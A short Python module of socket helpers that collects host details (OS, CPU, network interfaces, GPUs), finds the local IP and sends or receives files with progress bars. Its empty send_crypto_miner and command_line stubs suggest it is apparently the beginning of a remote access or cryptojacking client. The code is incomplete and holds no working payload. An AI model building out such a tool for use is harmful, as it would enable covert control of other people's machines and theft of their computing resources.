import tqdm
import os
import platform
import GPUtil
import socket
import psutil


def get_local_ip(client,hostname):
    
    local_ip = socket.gethostbyname(hostname)

    if local_ip.startswith('127.'):
        print("[+] Getting local ip by UDP...")
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.connect(('8.8.8.8',80))
        local_ip = udp_socket.getsockname()[0]
        udp_socket.close()
    
    return local_ip

def get_system_info():
    uname = platform.uname()

    system = uname.system
    release = uname.release 
    cpu = uname.processor
    network_interface = psutil.net_if_stats()
    gpus = GPUtil.getAvailable()

    return f"{system=} {release=} {cpu=} {network_interface=} {gpus=}"


def command_line(): 
    pass

def send_file(filename,buffer_size,connection,separator="<SEPARATOR>"):
    print(f"Sending '{filename}'") 
    file_size = os.path.getsize(filename)
    #SEND FILE DATA
    connection.send(f"{filename}{separator}{file_size}".encode())

    progress = tqdm.tqdm(
        range(file_size),
        f"Sending {filename}", 
        unit="B", 
        unit_scale=True, 
        unit_divisor=1024)
    
    with open(filename, "rb") as file:
        while True:
            bytes_read = file.read(buffer_size)
            if not bytes_read:
                break
            connection.sendall(bytes_read)
            progress.update(len(bytes_read))

def send_crypto_miner(): 
    return    


def receive_file(buffer_size,client,separator="<SEPARATOR>",):
    print("Receiving data..")
    encoding = 'utf-8' 
    file_data = client.recv(buffer_size).decode(encoding)
    #ADD TRY CATCH 
    filename,file_size = file_data.split(separator)
    #print(file_data)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    file_size = int(file_size)

    progress = tqdm.tqdm(
        range(file_size),
        f"Receiving {filename}", 
        unit="B", 
        unit_scale=True, 
        unit_divisor=1024)
    
    #WRITE BYTES IN FILE
    with open(filename,'wb') as file: 
        while True: 
            bytes_read = client.recv(buffer_size)
            if not bytes_read:
                break
            
            file.write(bytes_read)
            progress.update(len(bytes_read))

if __name__ == "__main__":
    get_system_info()